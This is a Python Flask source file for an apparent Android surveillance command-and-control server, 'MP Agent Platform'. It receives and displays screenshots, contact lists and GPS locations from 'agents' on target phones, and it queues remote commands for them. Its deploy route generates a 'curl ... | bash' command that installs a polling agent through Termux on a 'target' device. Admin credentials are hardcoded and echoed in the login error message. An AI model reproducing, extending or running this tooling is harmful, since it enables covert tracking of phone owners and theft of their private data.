from flask import Flask, request, jsonify, session, redirect, render_template, Response, send_file
import sqlite3
from datetime import datetime
import os
import time
import base64
from threading import Lock
import logging

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'mp_agent_platform_2024')
app.template_folder = 'templates'

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Admin credentials
ADMIN_USERNAME = "Mpc"
ADMIN_PASSWORD = "0220Mpc"

# Database lock
db_lock = Lock()

def init_database():
    with db_lock:
        conn = sqlite3.connect('mp_agent.db')
        cursor = conn.cursor()
        
        # Drop all old tables
        cursor.execute("DROP TABLE IF EXISTS agents")
        cursor.execute("DROP TABLE IF EXISTS screenshots")
        cursor.execute("DROP TABLE IF EXISTS contacts")
        cursor.execute("DROP TABLE IF EXISTS locations")
        cursor.execute("DROP TABLE IF EXISTS commands")
        cursor.execute("DROP TABLE IF EXISTS system_logs")
        
        # Create fresh tables
        cursor.execute('''
            CREATE TABLE agents (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT UNIQUE NOT NULL,
                phone_model TEXT,
                android_version TEXT,
                ip_address TEXT,
                status TEXT DEFAULT 'active',
                first_seen DATETIME,
                last_seen DATETIME,
                screenshot_count INTEGER DEFAULT 0,
                battery_level INTEGER,
                last_screenshot DATETIME,
                user_agent TEXT,
                is_real_device BOOLEAN DEFAULT 1
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE screenshots (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT,
                screenshot_data BLOB,
                timestamp DATETIME,
                is_real BOOLEAN DEFAULT 1
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE contacts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT,
                contact_name TEXT,
                phone_number TEXT,
                timestamp DATETIME,
                is_real BOOLEAN DEFAULT 1
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE locations (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT,
                latitude REAL,
                longitude REAL,
                accuracy REAL,
                address TEXT,
                timestamp DATETIME,
                is_real BOOLEAN DEFAULT 1
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT,
                command TEXT,
                status TEXT DEFAULT 'pending',
                result TEXT,
                timestamp DATETIME
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE system_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                level TEXT,
                message TEXT,
                timestamp DATETIME
            )
        ''')
        
        conn.commit()
        conn.close()
        logger.info("✅ Database initialized successfully")

def get_db_connection():
    conn = sqlite3.connect('mp_agent.db', timeout=30)
    conn.row_factory = sqlite3.Row
    return conn

def log_event(level, message):
    try:
        with db_lock:
            conn = get_db_connection()
            conn.execute(
                'INSERT INTO system_logs (level, message, timestamp) VALUES (?, ?, ?)',
                (level, message, datetime.now())
            )
            conn.commit()
            conn.close()
    except Exception as e:
        logger.error(f"Log event failed: {e}")

def row_to_dict(row):
    if row is None:
        return None
    return {key: row[key] for key in row.keys()}

def safe_fetchone(cursor):
    try:
        row = cursor.fetchone()
        return row_to_dict(row) if row else None
    except:
        return None

def safe_fetchall(cursor):
    try:
        rows = cursor.fetchall()
        return [row_to_dict(row) for row in rows] if rows else []
    except:
        return []

# Initialize database
try:
    init_database()
except Exception as e:
    logger.error(f"Database init failed: {e}")

# ==================== ADMIN ROUTES ====================

@app.route('/')
def index():
    if session.get('authenticated'):
        return redirect('/dashboard')
    return redirect('/login')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        try:
            username = request.form.get('username', '').strip()
            password = request.form.get('password', '').strip()
            
            if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
                session['authenticated'] = True
                session['username'] = username
                log_event('INFO', f'Admin login: {username}')
                return redirect('/dashboard')
            else:
                return '''
                <script>
                    alert("Invalid credentials! Use: Mpc / 0220Mpc");
                    window.location.href = "/login";
                </script>
                '''
        except Exception as e:
            logger.error(f"Login error: {e}")
            return "Login error", 500
    
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>MP Agent - Login</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); height: 100vh; display: flex; justify-content: center; align-items: center; }
            .login-container { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 15px 35px rgba(0,0,0,0.3); width: 100%; max-width: 400px; }
            .logo { text-align: center; margin-bottom: 30px; }
            .logo h1 { color: #333; font-size: 28px; margin-bottom: 10px; }
            .logo p { color: #666; font-size: 14px; }
            .form-group { margin-bottom: 20px; }
            .form-group label { display: block; margin-bottom: 8px; color: #333; font-weight: 600; }
            .form-group input { width: 100%; padding: 12px 15px; border: 2px solid #e1e1e1; border-radius: 8px; font-size: 14px; }
            .btn-login { width: 100%; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 12px; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; }
            .warning { background: #fff3cd; border: 1px solid #ffeaa7; padding: 10px; border-radius: 5px; margin-bottom: 20px; font-size: 12px; color: #856404; }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="logo">
                <h1>🔐 MP Agent Platform</h1>
                <p>Real Data Only - No Fake Data</p>
            </div>
            <div class="warning">
                <strong>⚠️ IMPORTANT:</strong> Collects only actual data from real Android devices.
            </div>
            <form method="POST" action="/login">
                <div class="form-group">
                    <label for="username">Username</label>
                    <input type="text" id="username" name="username" placeholder="Enter username" required>
                </div>
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" placeholder="Enter password" required>
                </div>
                <button type="submit" class="btn-login">Login to Control Panel</button>
            </form>
        </div>
    </body>
    </html>
    '''

@app.route('/dashboard')
def dashboard():
    if not session.get('authenticated'):
        return redirect('/login')
    
    try:
        with db_lock:
            conn = get_db_connection()
            
            stats = {
                'active_agents': conn.execute("SELECT COUNT(*) FROM agents WHERE status='active'").fetchone()[0] or 0,
                'total_screenshots': conn.execute("SELECT COUNT(*) FROM screenshots").fetchone()[0] or 0,
                'total_contacts': conn.execute("SELECT COUNT(*) FROM contacts").fetchone()[0] or 0,
                'total_locations': conn.execute("SELECT COUNT(*) FROM locations").fetchone()[0] or 0,
                'pending_commands': conn.execute("SELECT COUNT(*) FROM commands WHERE status='pending'").fetchone()[0] or 0
            }
            
            agents = safe_fetchall(conn.execute("SELECT * FROM agents WHERE status='active' ORDER BY last_seen DESC LIMIT 10"))
            screenshots = safe_fetchall(conn.execute('''
                SELECT s.*, a.phone_model FROM screenshots s 
                LEFT JOIN agents a ON s.agent_id = a.agent_id 
                WHERE s.screenshot_data IS NOT NULL 
                ORDER BY s.timestamp DESC LIMIT 6
            '''))
            contacts = safe_fetchall(conn.execute("SELECT * FROM contacts ORDER BY timestamp DESC LIMIT 10"))
            locations = safe_fetchall(conn.execute("SELECT * FROM locations ORDER BY timestamp DESC LIMIT 5"))
            
            conn.close()
        
        return render_template('dashboard.html',
                             stats=stats,
                             agents=agents,
                             screenshots=screenshots,
                             contacts=contacts,
                             locations=locations,
                             platform_url=request.host_url.rstrip('/'))
    except Exception as e:
        logger.error(f"Dashboard error: {e}")
        return "Error loading dashboard", 500

@app.route('/admin')
def admin_dashboard():
    if not session.get('authenticated'):
        return redirect('/login')
    
    try:
        with db_lock:
            conn = get_db_connection()
            
            stats = {
                'active_agents': conn.execute("SELECT COUNT(*) FROM agents WHERE status='active'").fetchone()[0] or 0,
                'total_screenshots': conn.execute("SELECT COUNT(*) FROM screenshots").fetchone()[0] or 0,
                'total_contacts': conn.execute("SELECT COUNT(*) FROM contacts").fetchone()[0] or 0,
                'total_locations': conn.execute("SELECT COUNT(*) FROM locations").fetchone()[0] or 0,
                'pending_commands': conn.execute("SELECT COUNT(*) FROM commands WHERE status='pending'").fetchone()[0] or 0
            }
            
            agents = safe_fetchall(conn.execute("SELECT * FROM agents ORDER BY last_seen DESC LIMIT 20"))
            screenshots = safe_fetchall(conn.execute('''
                SELECT s.*, a.phone_model FROM screenshots s 
                LEFT JOIN agents a ON s.agent_id = a.agent_id 
                WHERE s.screenshot_data IS NOT NULL 
                ORDER BY s.timestamp DESC LIMIT 12
            '''))
            contacts = safe_fetchall(conn.execute("SELECT * FROM contacts ORDER BY timestamp DESC LIMIT 15"))
            locations = safe_fetchall(conn.execute("SELECT * FROM locations ORDER BY timestamp DESC LIMIT 10"))
            commands = safe_fetchall(conn.execute("SELECT * FROM commands ORDER BY timestamp DESC LIMIT 10"))
            logs = safe_fetchall(conn.execute("SELECT * FROM system_logs ORDER BY timestamp DESC LIMIT 20"))
            
            conn.close()
        
        return render_template('admin_dashboard.html',
                             stats=stats,
                             agents=agents,
                             screenshots=screenshots,
                             contacts=contacts,
                             locations=locations,
                             commands=commands,
                             logs=logs,
                             platform_url=request.host_url.rstrip('/'))
    except Exception as e:
        logger.error(f"Admin dashboard error: {e}")
        return "Error loading admin dashboard", 500

# ==================== AGENT DOWNLOAD ROUTE ====================

@app.route('/download_agent')
def download_agent():
    """Serve the agent installation script"""
    try:
        phone = request.args.get('phone', 'unknown')
        platform_url = request.host_url.rstrip('/')
        
        agent_script = f'''#!/bin/bash
echo "🔍 MP Agent Installation Starting..."
echo "📱 Target: {phone}"
echo "🌐 Server: {platform_url}"

# Check requirements
if [ ! -d "/data/data/com.termux" ]; then
    echo "❌ ERROR: Must run in Termux on Android"
    echo "💡 Install Termux from F-Droid"
    exit 1
fi

echo "✅ Termux detected"
echo "📦 Installing packages..."

# Update and install
pkg update -y && pkg upgrade -y
pkg install -y python python-pip curl

echo "🐍 Installing Python dependencies..."
pip install requests

# Create agent directory
AGENT_DIR="$HOME/mp_agent"
mkdir -p "$AGENT_DIR"
cd "$AGENT_DIR"

# Create simple agent script
cat > agent.py << 'EOF'
import requests
import time
import sys
import subprocess
import json
from datetime import datetime

class RealAgent:
    def __init__(self, agent_id, server_url):
        self.agent_id = agent_id
        self.server_url = server_url
        
    def get_device_info(self):
        try:
            model = subprocess.run(['getprop', 'ro.product.model'], 
                                 capture_output=True, text=True).stdout.strip()
            android = subprocess.run(['getprop', 'ro.build.version.release'], 
                                   capture_output=True, text=True).stdout.strip()
            return model or "Real Device", android or "Real Android"
        except:
            return "Real Device", "Real Android"
    
    def register(self):
        model, android = self.get_device_info()
        try:
            response = requests.post(f"{{self.server_url}}/api/agent/register", json={{
                'agent_id': self.agent_id,
                'phone_model': model,
                'android_version': android
            }}, timeout=10)
            return response.status_code == 200
        except:
            return False
    
    def run(self):
        print(f"🤖 Agent started: {{self.agent_id}}")
        if self.register():
            print("✅ Registered with server")
        else:
            print("❌ Registration failed")
        
        while True:
            try:
                # Check for commands
                response = requests.get(f"{{self.server_url}}/api/agent/check_commands/{{self.agent_id}}", timeout=10)
                if response.status_code == 200:
                    commands = response.json().get('commands', [])
                    for cmd in commands:
                        print(f"📨 Command: {{cmd['command']}}")
                
                # Send heartbeat
                requests.post(f"{{self.server_url}}/api/agent/submit_report", json={{
                    'agent_id': self.agent_id,
                    'report_type': 'heartbeat',
                    'report_data': {{}}
                }}, timeout=10)
                
            except Exception as e:
                print(f"⚠️ Error: {{e}}")
            
            time.sleep(60)

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("Usage: python agent.py <agent_id> <server_url>")
        sys.exit(1)
    
    agent = RealAgent(sys.argv[1], sys.argv[2])
    agent.run()
EOF

echo "✅ Agent script created"
echo "🚀 Starting agent..."
python agent.py "{phone}" "{platform_url}"
'''

        log_event('INFO', f'Agent download: {phone}')
        
        return Response(
            agent_script,
            mimetype='text/x-shellscript',
            headers={'Content-Disposition': f'attachment; filename=mp_agent_{phone}.sh'}
        )
    except Exception as e:
        logger.error(f"Download agent error: {e}")
        return "Error generating agent script", 500

# ==================== AGENT API ROUTES ====================

@app.route('/api/agent/register', methods=['POST'])
def register_agent():
    """Register real devices"""
    try:
        data = request.get_json() or {}
        agent_id = data.get('agent_id')
        
        if not agent_id:
            return jsonify({'status': 'error', 'message': 'Agent ID required'}), 400
        
        phone_model = data.get('phone_model', 'Real Device')
        android_version = data.get('android_version', 'Real Android')
        ip_address = request.remote_addr
        user_agent = request.headers.get('User-Agent', 'Unknown')
        
        with db_lock:
            conn = get_db_connection()
            current_time = datetime.now()
            
            existing = safe_fetchone(conn.execute(
                "SELECT * FROM agents WHERE agent_id = ?", (agent_id,)
            ))
            
            if existing:
                conn.execute('''
                    UPDATE agents SET 
                    phone_model=?, android_version=?, ip_address=?, user_agent=?,
                    status='active', last_seen=?, is_real_device=1
                    WHERE agent_id=?
                ''', (phone_model, android_version, ip_address, user_agent, current_time, agent_id))
            else:
                conn.execute('''
                    INSERT INTO agents 
                    (agent_id, phone_model, android_version, ip_address, user_agent, 
                     status, first_seen, last_seen, is_real_device)
                    VALUES (?, ?, ?, ?, ?, 'active', ?, ?, 1)
                ''', (agent_id, phone_model, android_version, ip_address, user_agent, 
                      current_time, current_time))
            
            conn.commit()
            conn.close()
        
        log_event('INFO', f'Agent registered: {agent_id}')
        return jsonify({'status': 'success', 'message': 'Registered'})
        
    except Exception as e:
        logger.error(f"Register error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/agent/submit_report', methods=['POST'])
def submit_report():
    """Receive real data reports"""
    try:
        data = request.get_json() or {}
        agent_id = data.get('agent_id')
        report_type = data.get('report_type')
        report_data = data.get('report_data', {})
        
        if not agent_id:
            return jsonify({'status': 'error', 'message': 'Agent ID required'}), 400
        
        with db_lock:
            conn = get_db_connection()
            current_time = datetime.now()
            
            if report_type == 'screenshot':
                if 'image_data' in report_data and report_data['image_data']:
                    try:
                        image_data = report_data['image_data']
                        if image_data.startswith('data:image'):
                            image_data = image_data.split(',')[1]
                        screenshot_binary = base64.b64decode(image_data)
                        conn.execute(
                            'INSERT INTO screenshots (agent_id, screenshot_data, timestamp) VALUES (?, ?, ?)',
                            (agent_id, screenshot_binary, current_time)
                        )
                    except Exception as e:
                        logger.error(f"Screenshot error: {e}")
                
                conn.execute(
                    'UPDATE agents SET last_seen=?, last_screenshot=?, screenshot_count=screenshot_count+1 WHERE agent_id=?',
                    (current_time, current_time, agent_id)
                )
                
            elif report_type == 'location':
                latitude = report_data.get('latitude')
                longitude = report_data.get('longitude')
                if latitude and longitude:
                    conn.execute(
                        'INSERT INTO locations (agent_id, latitude, longitude, timestamp) VALUES (?, ?, ?, ?)',
                        (agent_id, latitude, longitude, current_time)
                    )
                
                conn.execute(
                    'UPDATE agents SET last_seen=? WHERE agent_id=?',
                    (current_time, agent_id)
                )
                
            elif report_type == 'contacts':
                contacts_list = report_data.get('contacts', [])
                for contact in contacts_list[:50]:  # Limit to 50
                    name = contact.get('name', '').strip()
                    phone = contact.get('phone', '').strip()
                    if name and phone:
                        conn.execute(
                            'INSERT INTO contacts (agent_id, contact_name, phone_number, timestamp) VALUES (?, ?, ?, ?)',
                            (agent_id, name, phone, current_time)
                        )
                
                conn.execute(
                    'UPDATE agents SET last_seen=? WHERE agent_id=?',
                    (current_time, agent_id)
                )
                
            elif report_type in ['device_info', 'heartbeat']:
                battery = report_data.get('battery', 0)
                conn.execute(
                    'UPDATE agents SET last_seen=?, battery_level=? WHERE agent_id=?',
                    (current_time, battery, agent_id)
                )
            
            conn.commit()
            conn.close()
        
        log_event('INFO', f'Report received: {report_type} from {agent_id}')
        return jsonify({'status': 'success', 'message': 'Report received'})
        
    except Exception as e:
        logger.error(f"Submit report error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/agent/check_commands/<agent_id>')
def check_commands(agent_id):
    try:
        with db_lock:
            conn = get_db_connection()
            commands = safe_fetchall(conn.execute(
                "SELECT id, command FROM commands WHERE agent_id=? AND status='pending'", 
                (agent_id,)
            ))
            conn.close()
        
        return jsonify({'commands': commands})
    except Exception as e:
        logger.error(f"Check commands error: {e}")
        return jsonify({'commands': []})

@app.route('/api/agent/command_result', methods=['POST'])
def command_result():
    try:
        data = request.get_json() or {}
        command_id = data.get('command_id')
        result = data.get('result', '')
        
        with db_lock:
            conn = get_db_connection()
            conn.execute(
                "UPDATE commands SET status='completed', result=? WHERE id=?",
                (result, command_id)
            )
            conn.commit()
            conn.close()
        
        return jsonify({'status': 'success'})
    except Exception as e:
        logger.error(f"Command result error: {e}")
        return jsonify({'status': 'error'}), 500

@app.route('/media/screenshot/<int:screenshot_id>')
def serve_screenshot(screenshot_id):
    if not session.get('authenticated'):
        return redirect('/login')
    
    try:
        with db_lock:
            conn = get_db_connection()
            screenshot = safe_fetchone(conn.execute(
                "SELECT screenshot_data FROM screenshots WHERE id=?", (screenshot_id,)
            ))
            conn.close()
        
        if screenshot and screenshot['screenshot_data']:
            return Response(screenshot['screenshot_data'], mimetype='image/jpeg')
        
        # Return simple text response for missing screenshots
        return "Screenshot not available", 404
        
    except Exception as e:
        logger.error(f"Screenshot serve error: {e}")
        return "Error", 500

# ==================== COMMAND ROUTES ====================

@app.route('/admin/command', methods=['POST'])
def send_command():
    if not session.get('authenticated'):
        return redirect('/login')
    
    try:
        agent_id = request.form.get('agent_id', '').strip()
        command = request.form.get('command', '').strip()
        
        if not agent_id or not command:
            return "Missing agent_id or command", 400
        
        with db_lock:
            conn = get_db_connection()
            conn.execute(
                'INSERT INTO commands (agent_id, command, timestamp) VALUES (?, ?, ?)',
                (agent_id, command, datetime.now())
            )
            conn.commit()
            conn.close()
        
        log_event('INFO', f'Command sent: {command} to {agent_id}')
        return redirect('/admin')
    except Exception as e:
        logger.error(f"Send command error: {e}")
        return "Error sending command", 500

# ==================== DEPLOYMENT ROUTE ====================

@app.route('/deploy', methods=['POST'])
def deploy_agent():
    if not session.get('authenticated'):
        return redirect('/login')
    
    try:
        target_phone = request.form.get('phone_number', '').strip()
        if not target_phone:
            return "Phone number required", 400
            
        agent_id = request.form.get('agent_id', f'real_{target_phone}').strip()
        platform_url = request.host_url.rstrip('/')
        agent_command = f"curl -s {platform_url}/download_agent?phone={agent_id} | bash"
        
        # Register deployment
        with db_lock:
            conn = get_db_connection()
            existing = safe_fetchone(conn.execute(
                "SELECT * FROM agents WHERE agent_id=?", (agent_id,)
            ))
            
            if not existing:
                conn.execute(
                    'INSERT INTO agents (agent_id, status, first_seen, last_seen, is_real_device) VALUES (?, ?, ?, ?, ?)',
                    (agent_id, 'deployed', datetime.now(), datetime.now(), 1)
                )
                conn.commit()
            
            conn.close()
        
        log_event('INFO', f'Agent deployment: {agent_id}')
        
        return f'''
        <html>
        <head><title>Deploy Agent</title></head>
        <body style="font-family: Arial; padding: 20px; background: #1a1a1a; color: white;">
            <h1>🎯 Deploy Real Data Agent</h1>
            <div style="background: #2d2d2d; padding: 20px; border-radius: 10px;">
                <h3>📱 Agent ID: {agent_id}</h3>
                <p>Collects <strong>ACTUAL DEVICE DATA</strong> only</p>
                
                <h3>🚀 Installation Command:</h3>
                <div style="background: #000; padding: 15px; border-radius: 5px; font-family: monospace;">
                    {agent_command}
                </div>
                
                <p style="margin-top: 20px;">
                    <strong>Run this command in Termux on target Android device</strong>
                </p>
                
                <a href="/admin" style="background: #667eea; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px;">
                    📊 Go to Dashboard
                </a>
            </div>
        </body>
        </html>
        '''
    except Exception as e:
        logger.error(f"Deploy error: {e}")
        return "Deployment error", 500

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/login')

# Health check endpoint for Render
@app.route('/health')
def health():
    return jsonify({'status': 'healthy', 'timestamp': datetime.now().isoformat()})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)